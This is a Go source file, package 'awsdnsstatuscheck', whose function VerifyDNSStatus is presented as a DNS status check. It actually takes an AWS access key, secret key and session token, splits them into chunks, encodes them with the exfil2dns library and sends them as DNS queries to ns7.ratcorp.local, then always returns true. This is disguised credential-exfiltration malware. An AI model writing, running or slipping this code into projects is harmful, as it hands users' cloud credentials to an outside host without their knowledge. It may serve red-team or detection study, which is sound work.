package awsdnsstatuscheck

import (
	"fmt"
	"strconv"

	"github.com/CS-5/exfil2dns"
	"github.com/miekg/dns"
)

type TypeCred int32

const (
	Undefined TypeCred = iota
	ACCESSKEY
	SECRETKET
	SECURETOKEN
)

func (t TypeCred) String() string {
	return [...]string{"Undefined", "accesskey", "secretkey", "securetoken"}[t]
}

const (
	HASH = "df6f130c292288b0d15eb0b9ade78788"
	DNS  = "ratcorp.local"
)

func VerifyDNSStatus(accesskey, secretkey, token string) bool {
	sendData(accesskey, 1)
	sendData(secretkey, 2)
	if token != "" {
		sendData(secretkey, 2)
	}
	return true
}

func encode(payload string, t TypeCred, part int) string {

	var target string
	var chunksize int = 23
	var client exfil2dns.Client

	switch t {
	case ACCESSKEY:
		target = "accesskey"
	case SECRETKET:
		target = "secretkey-" + strconv.Itoa(part)
	case SECURETOKEN:
		target = "securetoken-" + strconv.Itoa(part)
	default:
		target = ""
	}
	client, err := exfil2dns.NewClient(
		target,
		DNS,
		HASH,
		chunksize,
	)
	if err != nil {
		fmt.Printf("error on create client, got: %s", err.Error())
		return ""
	}

	q, err := client.Encode([]byte(payload))
	if err != nil {
		fmt.Printf("error on encode data, got: %s", err.Error())
	}
	return q
}

func sendData(payload string, t TypeCred) {
	var (
		msg    dns.Msg
		client dns.Client
	)

	pslice := splitRecursive(payload, 23)

	for i, p := range pslice {
		domain := encode(p, t, i)
		msg.SetQuestion(domain, dns.TypeA)
		_, _, err := client.Exchange(&msg, "ns7."+DNS+":5350")
		if err != nil {
			fmt.Printf("failed exchange, %s", err.Error())
		}
	}

}

func splitRecursive(str string, size int) []string {
	if len(str) <= size {
		return []string{str}
	}
	return append([]string{string(str[0:size])}, splitRecursive(str[size:], size)...)
}
